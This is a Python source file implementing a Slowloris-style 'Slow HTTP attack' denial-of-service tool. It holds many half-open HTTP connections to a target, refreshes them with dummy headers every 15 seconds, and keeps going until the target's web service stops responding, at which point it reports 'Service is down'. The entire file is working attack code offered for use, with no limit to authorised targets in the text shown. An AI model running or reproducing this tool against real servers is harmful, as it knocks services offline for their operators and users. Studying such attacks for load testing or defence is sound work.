#!/usr/bin/env python3
import os
import requests
import socket
import ssl
import random
import time


def create_socket(ip, port, is_https):
    """
    Create socket with HTTP header
    :param ip: Target IP address
    :param port: Target port
    :param ip: Target IP
    :param is_https: HTTPS connection setup
    :return: Returns created socket
    """
    # AF_INET = IPv4 address, SOCK_STREAM = TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Socket creation operation timeout
    s.settimeout(5)
    # If HTTPS is enabled, wrap socket and change port to 443
    if is_https == 'True':
        s = ssl.wrap_socket(s)
        port = 443
    # Add connection parameters (target IP and port)
    s.connect((ip, port))
    try:
        # Read file with user agents
        current_dir = os.path.dirname(os.path.abspath(__file__))
        file = os.path.join(current_dir, 'user-agents.txt')
        with open(file, "r", encoding="utf-8") as f:
            user_agents = f.readlines()
    except FileNotFoundError:
        # If file is does not exist, prepare one user agent
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
        ]
    # Add HEADER, method GET
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    # Add random user agent from list
    s.send("User-Agent: {}\r\n".format(user_agents[random.randint(0, len(user_agents) - 1)]).encode("utf-8"))
    # Add common Accept-Language (en-US)
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    # Return created socket
    return s


def launch(host, port, socket_limit, is_https):
    """
    Create socket with HTTP header
    :param host: Target host
    :param port: Target port
    :param socket_limit: Limit for creating sockets
    :param is_https: HTTPS connection setup
    :return: Returns log with server response
    """
    s = None
    log = []
    created_sockets = []
    response = {'target_url': host, 'attack_type': 'Slow HTTP attack', 'port': port, 'https': is_https}
    # Convert host to socket connection format
    ip = host.replace("https://", "").replace("http://", "").replace("www.", "")
    log.append(f"Attacking {ip} on port {port} with {socket_limit} sockets.")
    log.append("Creating sockets...")
    # Create sockets and add them to list
    for _ in range(socket_limit):
        try:
            s = create_socket(ip, port, is_https)
        except socket.error:
            break
        finally:
            created_sockets.append(s)
    # Keep repeating until service is down or connection cancelled
    while True:
        try:
            # Get host connection status (max timeout is 60 seconds)
            r = requests.get(host, timeout=60)
            r.raise_for_status()
            log.append(f"Sending headers... Socket count: {len(created_sockets)}")
            # Send all sockets
            for s in list(created_sockets):
                try:
                    # Send socket
                    s.send("X-WL: {}\r\n".format(random.randint(1, 3000)).encode("utf-8"))
                except socket.error:
                    # Remove blocked created socket
                    created_sockets.remove(s)
            # Recreate sockets
            log.append("Sockets recreating...")
            for _ in range(socket_limit - len(created_sockets)):
                try:
                    s = create_socket(ip, port, is_https)
                    if s:
                        created_sockets.append(s)
                except socket.error as e:
                    # Log socket error
                    log.append(e)
                    break
            log.append(f"Sleeping for {15} seconds...")
            # Suspend next execution
            time.sleep(15)
        # If exception occurs, attack is stopped
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError):
            # Host not responding error
            log.append(f"Service is down")
            # Prepare log and status
            response['available'] = False
            response['log'] = log
            # Return log with server response
            return response
        except requests.exceptions.MissingSchema:
            # Invalid input URL
            response = {'error': True, 'description': 'Invalid URL'}
            return response
